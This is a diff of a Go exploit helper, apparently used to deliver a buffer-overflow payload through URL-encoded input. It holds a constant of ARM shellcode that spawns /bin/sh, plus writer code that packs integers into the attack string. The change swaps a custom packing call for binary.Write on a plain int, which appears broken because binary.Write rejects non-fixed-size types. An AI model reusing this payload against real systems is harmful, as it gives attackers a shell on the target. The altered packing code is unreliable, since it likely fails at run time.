@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/binary"
 	"fmt"
 	"io"
 	"os"
@@ -8,7 +9,19 @@ import (
 
 const (
 	shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x0b\x27\xc1\x71\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58"
+	//todo
+	sixtyfour = uint64(^uint(0)) == ^uint64(0)
 )
+
+var intsize int
+
+func init() {
+	if sixtyfour {
+		intsize = 8
+	} else {
+		intsize = 4
+	}
+}
 
 type Urlencoder struct {
 	wrapped io.Writer
@@ -40,7 +53,9 @@ func (u *Urlencoder) WriteString(s string) (n int, err error) {
 }
 
 func (u *Urlencoder) WritePack(i int) (n int, err error) {
-	return u.Write(pack(i))
+	//return u.Write(pack(i))
+	err = binary.Write(u.wrapped, binary.LittleEndian, i)
+	return intsize, err
 }
 
 //Littleendian packing
